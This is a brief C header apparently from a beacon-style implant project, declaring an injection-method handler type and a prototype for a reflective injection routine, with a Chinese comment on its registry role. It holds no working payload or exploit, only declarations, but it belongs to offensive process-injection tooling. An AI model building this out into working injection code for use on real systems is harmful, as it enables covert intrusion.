#pragma once

#include "beacon_inject.h"

typedef BOOL (*InjectMethodHandler)(const InjectRequest* req,
                                    InjectResult* result,
                                    CHAR* err,
                                    SIZE_T err_size);

/* reflective method 的内部实现，供 inject.c 注册表调用。 */
BOOL InjectPrepareReflective(const InjectRequest* req,
                             InjectResult* result,
                             CHAR* err,
                             SIZE_T err_size);
